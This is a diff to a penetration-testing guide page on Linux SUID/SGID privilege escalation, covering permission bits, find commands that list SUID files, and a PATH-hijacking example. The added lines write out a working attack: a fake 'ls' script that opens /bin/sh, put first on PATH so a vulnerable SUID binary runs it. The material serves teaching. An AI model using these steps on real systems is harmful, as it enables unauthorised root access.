@@ -2,9 +2,9 @@
 
 ## Theory
 
-On UNIX-like systems, binaries have permissions, just like any other file. Some of them often are over-privileged, sometimes allowing attackers to escalate privileges on the system. These permissions can be read, write, execute or extended ones like setuid, setgid, sticky mode, and so on.
+On UNIX-like systems, binaries have permissions, just like any other file. Some of them often are over-privileged, sometimes allowing attackers to escalate their privileges on the system. The common permissions are **read**, **write**, **execute.** The extended ones are **setuid**, **setgid**, **sticky bit**, and so on.
 
-The setuid/setgid \(SUID/SGID\) bit allows the binary to run with the privileges of the user/group owner instead of those of the user executing it. They can be spotted with the `s` or `S` permission in the file user or group owner permissions \(i.e. `---s--s---`\). When the file permissions features an uppercase `S` instead of a lowercase one, it means the corresponding user or group owner doesn't have execution rights.
+The setuid/setgid \(SUID/SGID\) bits allows the binary to run with the privileges of the user/group owner instead of those of the user executing it. They can be spotted with the `s` or `S` permission in the file user or group owner permissions \(i.e. `---s--s---`\). When the file permissions features an uppercase `S` instead of a lowercase one, it means the corresponding user or group owner doesn't have execution rights.
 
 {% hint style="warning" %}
 **Limitations**
@@ -19,10 +19,12 @@ All suid or sgid-enabled files the user can have access to can be listed with th
 
 ```bash
 find $starting_path -perm -u=s -type f 2>/dev/null
-find $starting_path -perm -u=s -type f 2>/dev/null
+
+# Or in octal mode
+find $starting_path -perm -4000 -type f 2>/dev/null
 ```
 
-Binaries with these permissions are then targets to exploit to obtain the user or group owner privileges. There are many techniques that attackers use to hijack those binaries and obtain those rights.
+Vulnerable programs with these permissions are often targeted by attacker to obtain the user \(for setuid\) or group \(for setgid\) privileges. There are many techniques that attackers can use to hijack these binaries and obtain thet associated rights.
 
 ### Living of the land
 
@@ -32,7 +34,7 @@ Using standard binaries features to bypass security restrictions is called Livin
 
 ### Relative path calls
 
-If a SUID/SGID binary makes calls to programs using relative paths instead of absolute paths, attackers can try to make the binary run a program of the attacker's choosing.
+If a SUID/SGID binary makes calls to programs using relative paths instead of absolute paths, attackers can try to make the binary run a program controlled by the attacker. Let's take this vulnerable program as an example : 
 
 {% code title="vuln.c" %}
 ```c
@@ -47,8 +49,13 @@ int function(int argc, char *argv[]){
 In the example above, the SUID/SGID binary calls the `ls` program using a relative path. An attacker can try to create a `ls` program somewhere he has write access to and edit the `PATH` environment variable so that his custom program is executed when running the SUID/SGID binary.
 
 ```bash
-PATH=.:$PATH ./vuln
+mkdir -p /tmp/attacker
+cd /tmp/attacker && printf '#!/bin/sh\nexec /bin/sh\n' > /tmp/attacker/ls
+chmod +x /tmp/attacker/ls 
+PATH=/tmp/attacker:$PATH ./vuln
 ```
+
+When the `vuln` program will be run, the malicious `ls` program will be called and a shell will be opened ! 
 
 ### Binary exploitation
 
